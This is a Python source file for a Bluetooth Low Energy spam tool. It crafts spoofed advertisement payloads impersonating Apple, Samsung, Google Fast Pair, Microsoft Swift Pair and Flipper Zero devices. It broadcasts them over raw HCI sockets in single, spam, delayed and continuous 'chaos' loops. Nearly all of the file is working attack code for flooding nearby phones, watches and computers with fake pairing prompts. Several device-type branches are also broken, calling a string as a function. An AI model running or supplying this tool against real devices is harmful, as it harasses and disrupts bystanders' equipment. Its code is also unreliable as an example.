from enum import Enum
from typing import List
import os
import sys
import subprocess
import time
import struct
import socket
import string
import random

parent_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if parent_dir not in sys.path:
    sys.path.insert(0, parent_dir)
from debugs import debug

class PayloadType(Enum):
    MICROSOFT = "microsoft"
    APPLE = "apple"
    SAMSUNG = "samsung"
    GOOGLE = "google"
    FLIPPERZERO = "flipperzero"


class BleModule:
    SAMSUNG_WATCH_MODEL_VALUES: List[int] = [
        0x01, 0x02, 0x03, 0x04, 0x05,
        0x06, 0x07, 0x08, 0x09, 0x0A,
        0x0B, 0x0C, 0x0D, 0x0E, 0x0F,
        0x10, 0x11, 0x12, 0x13, 0x14,
        0x15, 0x16, 0x17, 0x18, 0x19,
    ]

    OGF_LE_CTL = 0x08
    OCF_LE_SET_ADV_PARAMETERS = 0x0006
    OCF_LE_SET_ADV_DATA = 0x0008
    OCF_LE_SET_ADV_ENABLE = 0x000A

    def __init__(self, hci_dev=0):
        self.hci_dev = hci_dev

    def _opcode(self, ogf, ocf):
        return (ogf << 10) | ocf

    def _hci_cmd(self, sock, ogf, ocf, params=b""):
        op = self._opcode(ogf, ocf)
        pkt = struct.pack("<BHB", 0x01, op, len(params)) + params
        sock.send(pkt)

    def _random_name(self, length=5):
        return "".join(
            random.choices(
                string.ascii_letters + string.digits,
                k=length
            )
        )

    def _gen_microsoft(self):
        name = self._random_name()
        name_bytes = name.encode("ascii")

        data = bytearray()
        data.append(7 + len(name_bytes) - 1)
        data += bytes([0xFF, 0x06, 0x00, 0x03, 0x00, 0x80])
        data += name_bytes

        return bytes(data)

    def _gen_apple(self):
        action_types = [
            0x27, 0x09, 0x02, 0x1E,
            0x2B, 0x2F, 0x01, 0x06, 0x20
        ]

        data = bytearray([
            0x0A,
            0xFF,
            0x4C, 0x00,
            0x0F,
            0x05,
            0xC0,
            random.choice(action_types),
        ])

        data += bytes(random.randint(0, 255) for _ in range(3))
        return bytes(data)

    def _gen_samsung(self):
        model = random.choice(self.SAMSUNG_WATCH_MODEL_VALUES)

        return bytes([
            14, 0xFF, 0x75, 0x00,
            0x01, 0x00, 0x02, 0x00,
            0x01, 0x01, 0xFF, 0x00,
            0x00, 0x43, model
        ])

    def _gen_google(self):
        rssi = (random.randint(0, 119) - 100) & 0xFF

        return bytes([
            3, 0x03, 0x2C, 0xFE,
            6, 0x16, 0x2C, 0xFE,
            0x00, 0xB7, 0x27,
            2, 0x0A, rssi,
        ])

    def _gen_flipperzero(self):
        name = self._random_name(5)
        name_bytes = name.encode("ascii")

        data = bytearray([
            0x02, 0x01, 0x06,
            0x06, 0x09,
        ])

        data += name_bytes

        data += bytes([
            0x03, 0x02, 0x81, 0x30,
            0x02, 0x0A, 0x00,
            0x05, 0xFF, 0xBA, 0x0F,
            0x4C, 0x75, 0x67, 0x26,
            0xE1, 0x80,
        ])

        return bytes(data)

    def _startble(self, hci_dev=0):
        hci_dev = f"hci{hci_dev}"
        try:
            subprocess.run(["hciconfig", hci_dev, "up"], check=True, capture_output=True)
            return
        except (FileNotFoundError, subprocess.CalledProcessError):
            pass
        try:
            subprocess.run(["ip", "link", "set", hci_dev, "up"], check=True, capture_output=True)
        except FileNotFoundError:
            debug("warn", "hciconfig or ip not found, please start ble manually!")
        except subprocess.CalledProcessError as e:
            debug("warn", f"could not start BLE adapter: {e}")
    def generate_payload(self, payload_type):
        generators = {
            PayloadType.APPLE: self._gen_apple,
            PayloadType.MICROSOFT: self._gen_microsoft,
            PayloadType.SAMSUNG: self._gen_samsung,
            PayloadType.GOOGLE: self._gen_google,
            PayloadType.FLIPPERZERO: self._gen_flipperzero,
        }

        return generators[payload_type]()

    def advertise(self, payload, interval_ms=100):
        sock = socket.socket(
            socket.AF_BLUETOOTH,
            socket.SOCK_RAW,
            socket.BTPROTO_HCI
        )

        sock.bind((self.hci_dev,))

        interval = max(0x0020, int(interval_ms / 0.625))

        params = struct.pack(
            "<HHBBB6sBB",
            interval,
            interval,
            0x00,
            0x00,
            0x00,
            b"\x00" * 6,
            0x07,
            0x00
        )

        self._hci_cmd(
            sock,
            self.OGF_LE_CTL,
            self.OCF_LE_SET_ADV_PARAMETERS,
            params
        )

        adv_data = bytes([len(payload)]) + payload.ljust(31, b"\x00")
        #adv_data = payload.ljust(31, b"\x00")
        self._hci_cmd(
            sock,
            self.OGF_LE_CTL,
            self.OCF_LE_SET_ADV_DATA,
            adv_data
        )

        self._hci_cmd(
            sock,
            self.OGF_LE_CTL,
            self.OCF_LE_SET_ADV_ENABLE,
            b"\x01"
        )

        return sock

    def stop_advertising(self, sock):
        self._hci_cmd(
            sock,
            self.OGF_LE_CTL,
            self.OCF_LE_SET_ADV_ENABLE,
            b"\x00"
        )
        sock.close()

    def run(self, device=None, mode="single", hci=0):
        self._startble(hci_dev=hci)
        debug("ok", "BLE Module Available")
        print("""
    Available Device Mode:                Available Device Types:
    Single                                Apple
    Spam                                  Samsung
    Delayed                               Google
    Chaos (all)                           Microsoft
            """)
        mode = input("Device Mode: ")
        if mode == "chaos":
            while True:
                try:
                    payloadtype = [PayloadType.APPLE, PayloadType.SAMSUNG, PayloadType.GOOGLE, PayloadType.MICROSOFT]
                    for payloads in payloadtype:
                        actual = self.generate_payload(payloads)
                        print(f"\rAdvertising {payloads}   ", end="", flush=True)
                        sock = self.advertise(payload=actual)
                        time.sleep(3)
                        self.stop_advertising(sock)
                except KeyboardInterrupt:
                    break
                except OSError:
                    debug("error", "Bluetooth Adapter may be down.")
                except Exception as e:
                    debug("critical", e)
                    sys.exit(1)
        else:
            devicetype = None
            device = input("Device Type: ")
            if device.lower() == ('apple'):
                devicetype = PayloadType.APPLE
            elif device.lower()('microsoft'):
                devicetype = PayloadType.MICROSOFT
            elif device.lower()('android'):
                devicetype = PayloadType.GOOGLE
            elif device.lower()('samsung'):
                devicetype = PayloadType.SAMSUNG
            elif device.lower()('flipperzero'):
                devicetype = PayloadType.FLIPPERZERO
            else:
                debug("error", "Invalid Device Type")
            if mode == "single":
                payload = self.generate_payload(devicetype)
                sock = self.advertise(payload)
                time.sleep(3)
                self.stop_advertising(sock)

            elif mode == "spam":
                while True:
                    try:
                        payload = self.generate_payload(devicetype)
                        sock = self.advertise(payload)
                        time.sleep(0.5)
                        self.stop_advertising(sock)
                    except KeyboardInterrupt:
                        break

            elif mode == "delayed":
                while True:
                    try:
                        payload = self.generate_payload(devicetype)
                        sock = self.advertise(payload)
                        time.sleep(4)
                        self.stop_advertising(sock)
                        time.sleep(6)
                    except KeyboardInterrupt:
                        break
            else:
                debug("error", "Invalid Device Mode")


if __name__ == "__main__":
    ble = BleModule()
    ble.run()